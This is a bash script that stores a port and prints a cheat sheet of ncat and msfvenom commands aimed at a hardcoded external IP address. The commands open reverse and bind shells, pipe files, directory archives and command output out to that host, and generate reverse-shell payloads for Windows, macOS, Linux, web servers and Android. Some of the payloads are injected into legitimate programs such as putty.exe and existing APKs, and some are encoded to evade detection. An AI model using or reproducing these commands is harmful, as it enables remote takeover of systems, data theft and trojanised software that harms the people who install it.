#!/bin/bash
Black='\033[0;30m'
Red='\033[0;31m'
Green='\033[0;32m'
IGreen='\033[0;92m'
Yellow='\033[0;33m'
IYellow='\033[0;93m'
Blue='\033[0;34m'
Purple='\033[0;35m'
Cyan='\033[0;36m'
White='\033[0;37m'
clear='\033[0m'
check() 
{
if [[ -e $HOME/.vf ]]
then
  echo ""
else
# payload port
echo -en "[${Green}✔${clear}] ${IYellow}ENTER VPN PORT (SETUP): ${clear}"
read vpnp
echo $vpnp >$HOME/.vf 
fi
}

check
#pending
# 1 ngrok vpn connect
# 1 internet connection check
# setup to github
ip=$(echo '193.161.193.99')
vport=$(cat $HOME/.vf)

echo -e "
[${Green}✔${clear}] ${Yellow}VPN Reverse Connect server scripts: ${clear}
[${Green}✔${clear}] ${IYellow}ACCESS TERMINAL ${clear}
\t${IGreen}├──${clear} ${Green}ncat $ip $vport –e /bin/bash ${clear}
\t${IGreen}└──${clear} ${Green}ncat -lkvp 5576 ${clear}

[${Green}✔${clear}] ${IYellow}SHARE TERMINAL ${clear}
\t${IGreen}├──${clear} ${Green}ncat -v -n $ip $vport ${clear}
\t${IGreen}└──${clear} ${Green}ncat -k -l -p 5576 -e /bin/bash ${clear}

[${Green}✔${clear}] ${IYellow}SHARE FILES QUICKLY${clear}
\t${IGreen}├──${clear} ${Green}ncat $ip $vport < \$PWD/share.EXT ${clear}
\t${IGreen}└──${clear} ${Green}ncat -vl -k 5576 > saved ${clear}

[${Green}✔${clear}] ${IYellow}RECEIVE SUBDIRECTORY QUICKLY ${clear}
\t${IGreen}├──${clear} ${Green}tar zcfP - * | ncat $ip $vport ${clear}
\t${IGreen}└──${clear} ${Green}ncat -lk -p 5576 | tar xvpz ${clear}

[${Green}✔${clear}] ${IYellow}SEND SUBDIRECTORY QUICKLY ${clear}
\t${IGreen}├──${clear} ${Green}ncat $ip $vport |tar xvpz ${clear}
\t${IGreen}└──${clear} ${Green}tar zcfP - *| ncat -l 5576 ${clear}

[${Green}✔${clear}] ${IYellow}USE ANY COMMAND SAVE OUTPUT ${clear}
\t${IGreen}├──${clear} ${Green}uname | ncat $ip $vport ${clear}
\t${IGreen}└──${clear} ${Green}ncat -lk -p 5576 > savedout ${clear}

[${Green}✔${clear}] ${IYellow}METASPLOIT PAYLOADS${clear}
\t${IGreen}├──${clear} ${Green}msfvenom -p${IGreen} windows/shell/reverse_tcp${clear} ${Green}LHOST=$ip LPORT=$vport -f exe > payload-name.exe 
\t${IGreen}├──${clear} ${Green}msfvenom -p${IGreen} windows/meterpreter/reverse_tcp${clear} ${Green}-e shikata_ga_nai -i 2 LHOST=$ip LPORT=$vport -f exe > payload-name.exe 
\t${IGreen}├──${clear} ${Green}msfvenom -p${IGreen} cmd/windows/reverse_powershell${clear} ${Green}LHOST=$ip LPORT=$vport > shell.bat
\t${IGreen}├──${clear} ${Green}msfvenom -p${IGreen} windows/shell_reverse_tcp${clear} ${Green}LHOST=$ip LPORT=$vport -f msi > shell.msi
\t${IGreen}├──${clear} ${Green}msfvenom -p${IGreen} windows/shell_reverse_tcp${clear} ${Green}LHOST=$ip LPORT=$vport -f dll > shell.dll
\t${IGreen}├──${clear} ${Green}msfvenom -p${IGreen} windows/x64/meterpreter_reverse_https${clear} ${Green}LHOST=$ip LPORT=$vport -f psh > shell.ps1
\t${IGreen}├──${clear} ${Green}msfvenom -p${IGreen} windows/x64/meterpreter/reverse_https${clear} ${Green}LHOST=$ip LPORT=$vport -f aspx > shell.aspx
\t${IGreen}├──${clear} ${Green}msfvenom -p${IGreen} windows/x64/meterpreter/reverse_https${clear} ${Green}LHOST=$ip LPORT=$vport -f vba
\t${IGreen}├──${clear} ${Green}msfvenom -p${IGreen} windows/meterpreter/reverse_tcp${clear} ${Green}LHOST=$ip LPORT=$vport -f < platform  
\t${IGreen}├──${clear} ${Green}msfvenom -p${IGreen} osx/x86/shell_bind_tcp${clear} ${Green}RHOST=$ip RPORT=$vport -f macho > payload-name.macho 
\t${IGreen}├──${clear} ${Green}msfvenom -p${IGreen} osx/x86/shell_reverse_tcp${clear} ${Green}LHOST=$ip LPORT=$vport -f macho > payload-name.macho 
\t${IGreen}├──${clear} ${Green}msfvenom -p${IGreen} osx/x86/shell_reverse_tcp${clear} ${Green}LHOST=$ip LPORT=$vport -f < platform  
\t${IGreen}├──${clear} ${Green}msfvenom -p${IGreen} linux/x86/meterpreter/reverse_tcp${clear} ${Green}LHOST=$ip LPORT=$vport -f elf > payload-name.elf 
\t${IGreen}├──${clear} ${Green}msfvenom -p${IGreen} generic/shell_bind_tcp${clear} ${Green}LHOST=$ip LPORT=$vport -f elf > payload-name.elf 
\t${IGreen}├──${clear} ${Green}msfvenom -p${IGreen} linux/x86/meterpreter/bind_tcp${clear} ${Green}LHOST=$ip LPORT=$vport -f elf > payload-name.elf 
\t${IGreen}├──${clear} ${Green}msfvenom -p${IGreen} linux/x86/meterpreter/reverse_tcp${clear} ${Green}LHOST=$ip LPORT=$vport -f < platform  
\t${IGreen}├──${clear} ${Green}msfvenom -p${IGreen} php/meterpreter_reverse_tcp${clear} ${Green}LHOST=$ip LPORT=$vport -f raw > payload-name.php 
\t${IGreen}├──${clear} ${Green}msfvenom -p${IGreen} java/jsp_shell_reverse_tcp${clear} ${Green}LHOST=$ip LPORT=$vport -f raw > payload-name.jsp 
\t${IGreen}├──${clear} ${Green}msfvenom -p${IGreen} windows/meterpreter/reverse_tcp${clear} ${Green}LHOST=$ip LPORT=$vport -f asp > payload-nmae.asp 
\t${IGreen}├──${clear} ${Green}msfvenom -p${IGreen} java/jsp_shell_reverse_tcp${clear} ${Green}LHOST=$ip LPORT=$vport -f war > payload-name.war 
\t${IGreen}├──${clear} ${Green}msfvenom -p${IGreen} cmd/unix/reverse_perl${clear} ${Green}LHOST=$ip LPORT=$vport -f raw > payload-name.pl 
\t${IGreen}├──${clear} ${Green}msfvenom -p${IGreen} cmd/unix/reverse_bash${clear} ${Green}LHOST=$ip LPORT=$vport -f raw > payload-name.sh 
\t${IGreen}├──${clear} ${Green}msfvenom -p${IGreen} cmd/unix/reverse_python${clear} ${Green}LHOST=$ip LPORT=$vport -f raw > payload-name.py 
\t${IGreen}├──${clear} ${Green}msfvenom -p${IGreen} android/meterpreter/reverse_tcp${clear} ${Green}LHOST=$ip LPORT=$vport R > payload-name.apk 
\t${IGreen}├──${clear} ${Green}msfvenom -x app.apk -p${IGreen} android/meterpreter/reverse_tcp${clear} ${Green}LHOST=$ip LPORT=$vport -o out.apk 
\t${IGreen}├──${clear} ${Green}msfvenom -a x86 --platform windows -x putty.exe -k -p${IGreen} windows/meterpreter/reverse_tcp${clear} ${Green}LHOST=$ip LPORT=$vport -e x86/shikata_ga_nai -i 3 -b \"\\\x00\" -f exe -o bind.exe
\t${IGreen}└──${clear} ${Green}msfvenom --platform android --arch dalvik -x myApp.apk -p${IGreen} android/meterpreter/reverse_tcp${clear} ${Green}LHOST=$ip LPORT=$vport -o build.apk${clear}
"
